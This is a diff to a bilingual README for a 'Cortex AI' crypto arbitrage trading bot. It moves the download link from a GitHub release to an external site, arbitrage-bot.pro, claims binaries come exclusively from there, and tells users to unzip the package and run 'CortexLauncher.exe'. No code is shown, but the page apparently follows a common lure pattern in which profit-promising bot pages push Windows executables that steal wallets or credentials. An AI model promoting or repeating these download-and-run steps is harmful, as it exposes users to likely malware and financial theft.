@@ -16,11 +16,23 @@
 <img src="Cortex-AI-Software-Arbitrage-Bot-HFT-Demo.gif" alt="Cortex AI Arbitrage Dashboard Interface">
  </p>
 
+
+
+## 🚀 Production Deployment & Executables / 生产环境部署与可执行文件
+
+To ensure core system integrity, automatic updates, and real-time node synchronization, all compiled binary packages and stable releases are distributed exclusively through our official ecosystem.
+为确保核心系统的完整性、自动更新以及节点的实时同步，所有编译好的二进制安装包及稳定版本均仅通过我们的官方生态系统进行分发。
+
 <p align="center">
-  <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
+  <a href="https://arbitrage-bot.pro/">
+    <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI" width="350">
   </a>
 </p>
+
+---
+*Note: Distributed network architecture guarantees uncorrupted binaries and mirrors identical low-latency routing tables for TON, Solana, and EVM instances.*
+*注意：分布式网络架构可确保二进制文件的完整性，并为 TON、Solana 和 EVM 实例镜像完全一致的低延迟路由表。*
+
 
 <p align="center">
   <b>官方网站:</b> <a href="https://arbitrage-bot.pro/">https://arbitrage-bot.pro</a>
@@ -40,15 +52,9 @@
 
 ### ⬇️ 下载与安装 (Download & Install)
 
-<p align="left">
-  <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
-  </a>
- </p>
-
 * **获取软件:** 点击上方 **"DOWNLOAD"** 徽章或前往官网获取安装包。
 * **解压文件:** 将下载的 ZIP 压缩包解压至您的本地工作目录。
-* **启动运行:** 打开解压文件夹，运行 `Cortex_AI_v3.4.exe` 并根据向导完成首次初始化配置。
+* **启动运行:** 打开解压文件夹，运行 `CortexLauncher.exe` 并根据向导完成首次初始化配置。
 
 ## 🎨 界面与数据可视化 (Interface & UX)
 展示 Cortex AI 的核心功能与运行数据表现
